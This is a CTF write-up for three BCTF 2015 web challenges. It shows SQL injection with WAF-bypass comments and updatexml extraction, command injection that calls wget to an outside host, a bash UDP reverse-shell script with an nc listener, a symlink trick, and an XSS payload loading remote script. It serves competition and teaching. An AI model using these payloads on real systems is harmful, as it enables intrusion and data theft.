---
layout: post
title: BCTF 2015 WEB Writeup
---

#### Checkin 10

Desc: Please checkin at IRC

- IRC: [http://webchat.freenode.net/](http://webchat.freenode.net/)
- Channels: bctf

Bulletin board:
    
    [BCTF 2015 has started. Check in flag: OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx}. 

Rot13 decode:

    OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx} <--> BCTF{we1c0me-t0-BCTF-2015_g00d-luck}

-----------   
 
#### Sqli_engineScore 200

![http://ww2.sinaimg.cn/large/c334041bgw1eqehdrsxq4j20j40cndgr.jpg](http://ww2.sinaimg.cn/large/c334041bgw1eqehdrsxq4j20j40cndgr.jpg)

Desc: 

> http://104.197.7.111:8080/
> 
> geohot told me he has a lot of sql injection tricks. So I wrote a sql injection detection engine in defense.
> 
> Now you have a simple website protected by my engine, try to steal the admin’s password(not hash).

Username, Password ::: SQLi

      <form id="submit-form" class="form-group" action="/register" method="POST">
        <input type="text" placeholder="username" class="form-control" name="username"/>
        <input type="password" placeholder="password" class="form-control" name="password"/>
        <span class="input-icon fui-check-inverted"></span>
        <br />
        <div class="row">
          <div class="col-xs-3"> <button type="submit" class="btn btn-block btn-lg btn-primary">Register</button> </div>
          Already registered?<a href="/static/login.html">Click Here to Login</a>
        </div>
        <br />
      </form>
      
SQL Injection:

    URL: http://104.197.7.111:8080/register
    POST: username=admin&password=,'

    error executing sql: insert into users (username, password) values ('admin', ','')

    (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '','')' at line 1")

Continue:

    username=admin\&password=,updatexml(1,(select password from users limit 1),1) or '

    password contains SQL injection, IP recorded.
    
Bypass WAF:

    username=admin\&password=,updatexml(1,(/*/*/select password from/*/*/users limit/*/*/1),1) or/*/*/'

    (1105, "XPATH syntax error: '{h0w-d1d-y0u-fee1-l1ke-th3-sql1-'")
    
Substring right:

    username=admin\&password=,updatexml(1,(/*/*/select right(password,33)/*/*/from/*/*/users limit/*/*/1),1) or/*/*/'

    (1105, "XPATH syntax error: 'd-y0u-fee1-l1ke-th3-sql1-eng1ne}'")
    
String concatenation (FLAG):

	{h0w-d1d-y0u-fee1-l1ke-th3-sql1-eng1ne}
	
-------------

#### Torrent_loverScore 233

Desc: A dog loves torrent.

![http://ww1.sinaimg.cn/large/c334041bgw1eqegar7st4j20ac03sdfz.jpg](http://ww1.sinaimg.cn/large/c334041bgw1eqegar7st4j20ac03sdfz.jpg)

![http://ww3.sinaimg.cn/large/c334041bgw1eqegb9eahij20a502gq2y.jpg](http://ww3.sinaimg.cn/large/c334041bgw1eqegb9eahij20a502gq2y.jpg)

http://218.2.197.253/zhongzi/index.php:

![http://ww3.sinaimg.cn/large/c334041bgw1eqegc3043aj20ex0b13zl.jpg](http://ww3.sinaimg.cn/large/c334041bgw1eqegc3043aj20ex0b13zl.jpg)

We guess, Maybe the command execution, The program calls the system function? Because we have no other way. :-(

Testing:

    http://www.google.com/`wget worm.cc:8000`/1.torrent
    http://www.google.com/`wget${IFS}worm.cc:8000`/1.torrent

We have received req (404):

    root@e:/rootkit# python -m SimpleHTTPServer
    Serving HTTP on 0.0.0.0 port 8000 ...
    118.186.202.142 - - [22/Mar/2015 13:44:39] "GET / HTTP/1.1" 200 -
    118.186.202.142 - - [22/Mar/2015 13:44:41] code 404, message File not found

ubd.sh:

    #!/bin/bash

    exec 9<> /dev/udp/localhost/8088
    [ $? -eq 1 ] && exit
    echo "connect ok" >&9

    while :
    do
      a=`dd bs=200 count=1 <&9 2>/dev/null`
      if echo "$a"|grep "exit"; then break; fi
      echo `$a` >&9
    done

    exec 9>&-
    exec 9<&-
    
nc -lu 8088

![http://ww3.sinaimg.cn/large/c334041bgw1eqegkzopavj20s9083acl.jpg](http://ww3.sinaimg.cn/large/c334041bgw1eqegkzopavj20s9083acl.jpg)

find use_me_to_read_flag and flag:

    /var/www/flag/use_me_to_read_flag /var/www/flag/flag
    >_ Permission denied
    
IDA, see _strstr "flag":

![http://ww2.sinaimg.cn/large/c334041bgw1eqeguifv68j20vw0br76y.jpg](http://ww2.sinaimg.cn/large/c334041bgw1eqeguifv68j20vw0br76y.jpg)

Cat FLAG:

    ln -s /var/www/flag/flag /tmp/warning
    /var/www/flag/use_me_to_read_flag /tmp/warning
    
![http://ww1.sinaimg.cn/large/c334041bgw1eqegx2zctxj20fm03zjro.jpg](http://ww1.sinaimg.cn/large/c334041bgw1eqegx2zctxj20fm03zjro.jpg)

-------------

#### Webchat 325

Desc: http://146.148.60.107:9991/

![http://ww2.sinaimg.cn/large/c334041bgw1eqeh1ri1hwj20ka0co3zm.jpg](http://ww2.sinaimg.cn/large/c334041bgw1eqeh1ri1hwj20ka0co3zm.jpg)

Websocket XSS? SQL Injection?

View-source:

    <script>
        $(document).ready(
        function() {
            function connect() {
                $("#status").text("Connecting");
                $("#status").attr("class", "text-primary");
                var ws = new window.WebSocket('ws://' + location.host + '/ws');
                ws.onopen = function() { $("#status").attr('class', 'text-success').text('Connected'); 
                    $("#submit_btn").attr('disabled', false).click(function() {
                        $("#sendstatus").attr('class', 'text-primary').text('Sending...');
                        ws.send($("#i_nick").val() + ": " + $("#i_msg").val());
                    });
                }
                ws.onclose = function() { $("#status").attr('class', 'text-danger').text('Disconnected'); setTimeout(connect, 5000);}
                ws.onerror = function() { $("#status").attr('class', 'text-danger').text('Failed to connect.'); }
                ws.onmessage = function(datad) {
                    var data = datad.data;
                    if (data[0] == 'm') $("#msg").html(data.substr(1) + "<br/>" +  $("#msg").html());
                    if (data[0] == 's') { $("#i_msg").val(''); $("#sendstatus").attr('class', 'text-success').text('Message Sent');}
                    if (data[0] == 'e') { $("#i_msg").val(''); $("#sendstatus").attr('class', 'text-danger').text('Message Rejected');}
                }
            }
            connect();
        });
    </script>
    
- http://ironwasp.org/cswsh.html
- ws://146.148.60.107:9991/ws

![http://ww1.sinaimg.cn/large/c334041bgw1eqeh4j4q9ej20qu0dmmy6.jpg](http://ww1.sinaimg.cn/large/c334041bgw1eqeh4j4q9ej20qu0dmmy6.jpg)    mysql> select hex('<script src=http://xss.net/0TLs5n?1426923466></script>');
    +--------------------------------------------------------------+
    | hex('<script src=http://xss.net/0TLs5n?1426923466></script>')                                                         	|
    +--------------------------------------------------------------+
    | 	
	3C73637269707***********3D687474703A2F2F7873732E6861636B7461736B2E6E65742F30544C73356E3F
    |
	+--------------------------------------------------------------+    test: '),(0x3C73637269707***********3D687474703A2F2F7873732E6861636B7461736B2E6E65742F30544C73356E3F),('

![http://ww2.sinaimg.cn/large/c334041bgw1eqehatp9ujj209106t3yz.jpg](http://ww2.sinaimg.cn/large/c334041bgw1eqehatp9ujj209106t3yz.jpg)

[http://146.148.60.107:9991/review?pass=QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==&id=24](http://146.148.60.107:9991/review?pass=QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==&id=24)

Page Content: Only admin in local network with correct password can review chat logs. But you've already had the flag you want,right?

    ➜  ~  echo -n "QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==" | base64 -D
    BCTF{xss_is_not_that_difficult_right}